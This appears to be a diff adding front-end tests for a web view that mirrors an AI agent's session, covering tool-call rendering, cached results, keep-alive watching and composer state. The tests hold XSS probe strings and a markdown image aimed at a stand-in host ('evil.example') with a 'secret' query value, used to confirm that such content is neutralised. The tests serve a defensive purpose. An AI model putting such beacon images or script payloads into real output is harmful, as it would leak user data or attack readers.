@@ -84,6 +84,57 @@ const PAGE_TESTS = async () => {
   test('agent: no message HTML is ever inserted as HTML', () => { C.renderAgentParts(el, [{ type: 'text', text: '<img src=x onerror=alert(1)>' }, { type: 'tool_call', id: 'h', title: '<b onclick=alert(1)>x</b>', kind: 'run', status: 'done', input: '<script>window.__agentx=1</script>' }, { type: 'tool_result', callId: 'h', text: '<img src=y onerror=alert(2)>', bytes: 30 }], { T: TA, results: C.resultsOf([{ type: 'tool_result', callId: 'h', text: '<img src=y onerror=alert(2)>', bytes: 30 }]) }); eq(el.querySelector('[onerror]'), null); eq(el.querySelector('[onclick]'), null); eq(el.querySelector('script'), null); eq(window.__agentx, undefined); });
   test('agent: a PR chip links out safely', () => { C.renderAgentParts(el, [{ type: 'status', kind: 'pr', n: 1545, url: 'https://github.com/o/r/pull/1545' }, { type: 'status', kind: 'pr', n: 9, url: 'javascript:alert(1)' }], { T: TA }); const links = el.querySelectorAll('a'); eq(links.length, 1); eq(links[0].getAttribute('href'), 'https://github.com/o/r/pull/1545'); ok(el.textContent.includes('PR #9')); });
 
+  test('fix C2: outside images in agent text wait for a tap', () => { C.renderAgentParts(el, [{ type: 'text', text: 'see ![x](https://evil.example/p.gif?d=secret)' }], { T: TA, TB: T }); eq(el.querySelector('img'), null); ok(el.querySelector('button.comms__imgload')); });
+  test('fix I7: a fetched result stays open after a repaint', () => {
+    const parts = [{ type: 'tool_call', id: 'k', title: 'cat', kind: 'run', status: 'done', input: 'cat f' }, { type: 'tool_result', callId: 'k', text: 'HEAD', bytes: 5000, ref: '9:0' }, { type: 'thought', ref: '8:0', chars: 5 }];
+    const cache = new Map([['9:0', { text: 'HEAD...FULLTAIL' }], ['8:0', { text: 'OPENTHOUGHT' }]]);
+    C.renderAgentParts(el, parts, { T: TA, results: C.resultsOf(parts), cache, opened: new Set(['8:0']) });
+    ok(el.textContent.includes('FULLTAIL'));
+    ok(!el.textContent.includes('Show all'));
+    ok(el.textContent.includes('OPENTHOUGHT'));
+  });
+  test('fix C1 and I8: the open view keeps the session watched and the header honest', async () => {
+    const AV2 = await import('/assets/js/comms/agent-view.js');
+    const mkEl = (tag) => document.createElement(tag || 'div');
+    const els = { log: mkEl(), chatTitle: mkEl('span'), chatAvatar: mkEl('span'), status: mkEl('span'), leave: mkEl('button'), peers: mkEl(), enc: mkEl(), callStart: mkEl('button'), share: mkEl('button'), msg: mkEl('input'), go: mkEl('button') };
+    let online = true;
+    const calls = [];
+    const client = { on: () => () => {}, sessions: () => [{ sid: 's', online }], turns: () => [], turn: () => null, hello: (sid) => calls.push('hello:' + sid), watch: (sid) => calls.push('watch:' + sid), list() {}, open() {}, get() {}, channel: () => true, reset() {} };
+    const v = AV2.createAgentView({ els, T: { agent: { running: 'running on your Mac', offline: 'Mac offline', message: 'Message the {name}' }, chat: {} }, client, keepAliveMs: 40, statusMs: 40 });
+    v.open('s', null, 'S');
+    eq(els.status.textContent, 'running on your Mac');
+    online = false;
+    await sleep(150);
+    ok(calls.filter((c) => c === 'watch:s').length >= 2, calls.join(','));
+    eq(els.status.textContent, 'Mac offline');
+    v.close();
+    const n = calls.length;
+    await sleep(120);
+    eq(calls.length, n);
+  });
+
+  test('fix I9 and M5: resume refetches, and the composer waits for a live channel', async () => {
+    const AV3 = await import('/assets/js/comms/agent-view.js');
+    const mkEl = (tag) => document.createElement(tag || 'div');
+    const els = { log: mkEl(), chatTitle: mkEl('span'), chatAvatar: mkEl('span'), status: mkEl('span'), leave: mkEl('button'), peers: mkEl(), enc: mkEl(), callStart: mkEl('button'), share: mkEl('button'), msg: mkEl('input'), go: mkEl('button') };
+    const handlers = {};
+    let chan = false;
+    const calls = [];
+    const client = { on: (t, fn) => { handlers[t] = fn; return () => {}; }, sessions: () => [{ sid: 's', online: true }], turns: () => [], turn: () => null, hello: (sid) => calls.push('hello:' + sid), watch() {}, list() {}, open() {}, get() {}, channel: () => chan, reset: (sid, sub) => calls.push('reset:' + sid + ':' + (sub || '')) };
+    const v = AV3.createAgentView({ els, T: { agent: { message: 'Message the {name}', mirror_only: 'Mirror only' }, chat: {} }, client });
+    v.open('s', null, 'S');
+    eq(els.msg.disabled, true);
+    eq(els.msg.placeholder, 'Mirror only');
+    chan = true;
+    handlers.chan({ t: 'chan', sid: 's' });
+    eq(els.msg.disabled, false);
+    eq(els.msg.placeholder, 'Message the S');
+    calls.length = 0;
+    v.resume();
+    deepEq(calls, ['reset:s:', 'hello:s']);
+    v.close();
+  });
+
   const R = (i) => btoa(String.fromCharCode(...new Uint8Array(16).fill(i))).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
   const MH = btoa(String.fromCharCode(...new Uint8Array(32).fill(2))).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
   const REF0 = R(10);
